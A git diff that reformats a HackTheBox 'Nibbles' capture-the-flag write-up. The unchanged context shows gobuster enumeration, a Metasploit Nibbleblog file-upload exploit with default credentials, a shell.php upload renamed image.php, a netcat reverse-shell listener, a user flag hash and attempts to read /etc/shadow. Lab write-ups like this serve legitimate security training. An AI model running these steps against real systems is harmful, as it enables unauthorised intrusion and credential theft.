@@ -1,25 +1,36 @@
 ---
-title: "Nibbles Machine (HackTheBox) — Step-by-Step Walkthrough"
-date: "2025-08-23"
+title: 'Nibbles Machine (HackTheBox) — Step-by-Step Walkthrough'
+date: '2025-08-23'
 draft: false
-tags: ["linux", "hackthebox", "easy", "file-upload", "reverse-shell", "metasploit", "sudo-exploitation", "privilege-escalation", "web-exploitation"]
-summary: "Compromise of a Linux HackTheBox machine running Nibbleblog 4.0.3, exploited through default credentials and an authenticated file upload vulnerability to gain a reverse shell, followed by privilege escalation by abusing a world-writable sudo script."
-images: ["/static/images/nibbles/preview.png"]
+tags:
+  [
+    'linux',
+    'Machine',
+    'hackthebox',
+    'easy',
+    'file-upload',
+    'reverse-shell',
+    'metasploit',
+    'sudo-exploitation',
+    'privilege-escalation',
+    'web-exploitation',
+  ]
+summary: 'Compromise of a Linux HackTheBox machine running Nibbleblog 4.0.3, exploited through default credentials and an authenticated file upload vulnerability to gain a reverse shell, followed by privilege escalation by abusing a world-writable sudo script.'
+images: ['/static/images/nibbles/preview.png']
 ---
-
 
 ![Nibbles](/static/images/nibbles/head.png)
 
 # Machine information:
 
-| Machine Name | Nibbles |
-| --- | --- |
-| Creator | mrb3n |
-| Operating System | Linux |
-| Difficulty | Easy |
-| User Path | Web |
+| Machine Name         | Nibbles                                        |
+| -------------------- | ---------------------------------------------- |
+| Creator              | mrb3n                                          |
+| Operating System     | Linux                                          |
+| Difficulty           | Easy                                           |
+| User Path            | Web                                            |
 | Privilege Escalation | World-writable File / Sudoers Misconfiguration |
-| ip address | 10.129.167.47 |
+| ip address           | 10.129.167.47                                  |
 
 # Pinging:
 
@@ -46,7 +57,7 @@ Host is up (0.077s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
 |   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
 |_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
@@ -78,7 +89,6 @@ http://10.129.167.47 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[
 This tool does not identify any standard web technologies in use. So I decided to browse it on Firefox but it was just a “Hello World!” prompt.
 
 ![Nibbles](/static/images/nibbles/image.png)
- 
 
 Next, I decided to **look at the source code of the website**. I did this to check if the creators accidentally left behind:
 
@@ -87,7 +97,7 @@ Next, I decided to **look at the source code of the website**. I did this to che
 
 ![Nibbles](/static/images/nibbles/image%201.png)
 
- **`Nothing interesting here!`**  
+**`Nothing interesting here!`**
 
 But I’ll check the **`/nibbleblog/`**
 
@@ -107,7 +117,7 @@ i don’t know the **`Nibbleblog` version, s**o now, I’ll use a tool called **
 
 ```bash
 ┌─[us-academy-5]─[10.10.14.143]─[htb-ac-859907@htb-jdp7eecvwx]─[~]
-└──╼ [★]$ gobuster dir -u http://10.129.167.47/nibbleblog -w /usr/share/seclists/Discovery/Web-Content/common.txt 
+└──╼ [★]$ gobuster dir -u http://10.129.167.47/nibbleblog -w /usr/share/seclists/Discovery/Web-Content/common.txt
 ===============================================================
 Gobuster v3.6
 by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
@@ -155,7 +165,7 @@ This is important because the exploit I found earlier is designed to work on thi
 
 The exploit takes advantage of a weakness in the **file upload feature,** which means I can try to upload a malicious file to gain access.
 
-So to do that I navigated to the admin page 
+So to do that I navigated to the admin page
 
 ![Nibbles](/static/images/nibbles/image%206.png)
 
@@ -254,10 +264,10 @@ PasswORD => nibbles
 [msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) >> set targeturi /nibbleblog/admin.php
 targeturi => /nibbleblog/admin.php
 [msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) >> exploit
-[*] Started reverse TCP handler on 10.10.14.143:4444 
+[*] Started reverse TCP handler on 10.10.14.143:4444
 [!] This exploit may require manual cleanup of 'image.php' on the target
 [*] Exploit completed, but no session was created.
-[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) >> 
+[msf](Jobs:0 Agents:0) exploit(multi/http/nibbleblog_file_upload) >>
 ```
 
 Now I’ll will make a **`shell.php`** file which has a malicious code in it and will start the listener on my device to get the shell.
@@ -270,14 +280,14 @@ I uploaded the **`shell.php`** but i didn't find it anywhere in the plugin direc
 
 So I think the issue is of the name of the file.
 
-I renamed the file 
+I renamed the file
 
 ```bash
 ┌─[us-academy-5]─[10.10.14.143]─[htb-ac-859907@htb-6m4xvjq7mb]─[~/Nibbles]
 └──╼ [★]$ mv shell.php image.php
 ```
 
-Then I uploaded the file again. 
+Then I uploaded the file again.
 
 ![Nibbles](/static/images/nibbles/image%2011.png)
 
@@ -302,7 +312,7 @@ nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ ^Z
 └──╼ [★]$ stty raw -echo; fg
 nc -lvnp 4444
 
-nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ 
+nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$
 ```
 
 ## User Flag
@@ -321,14 +331,14 @@ personal.zip  user.txt
 nibbler@Nibbles:/home/nibbler$ cat user.txt
 cat user.txt
 79c03865431abf47b90ef24b9695e148
-nibbler@Nibbles:/home/nibbler$ 
+nibbler@Nibbles:/home/nibbler$
 ```
 
 User Flag : **`79c03865431abf47b90ef24b9695e148`**
 
 ## Root Flag Search
 
-I looked for the **`/root` directory** and can’t even look into the directory 
+I looked for the **`/root` directory** and can’t even look into the directory
 
 ![Nibbles](/static/images/nibbles/image%2013.png)
 
@@ -371,7 +381,7 @@ nibbler:x:1001:1001::/home/nibbler:
 nibbler@Nibbles:/$ cat /etc/shadow
 cat /etc/shadow
 cat: /etc/shadow: Permission denied
-nibbler@Nibbles:/$ 
+nibbler@Nibbles:/$
 ```
 
 Nothing useful found in the **`passwd`** file and didn’t have the read permissions for the **`shadow`** file.
@@ -381,11 +391,11 @@ Inside the **home directory of `nibbler`**, there is a **ZIP file `[personal.zip
 Since there was **nothing useful in the `crontabs`** (meaning no scheduled tasks were set up for the `nibbler` user), I’ll extract the contents of this ZIP file to see if it contains anything that could help me move further — like credentials, scripts, or hidden configurations.
 
 ```bash
-nibbler@Nibbles:/home/nibbler$ unzip personal.zip 
+nibbler@Nibbles:/home/nibbler$ unzip personal.zip
 Archive:  personal.zip
    creating: personal/
    creating: personal/stuff/
-  inflating: personal/stuff/monitor.sh  
+  inflating: personal/stuff/monitor.sh
 ```
 
 The [monitor.sh](http://monitor.sh) looks useful as this file can be executed with **`sudo privileges`**.
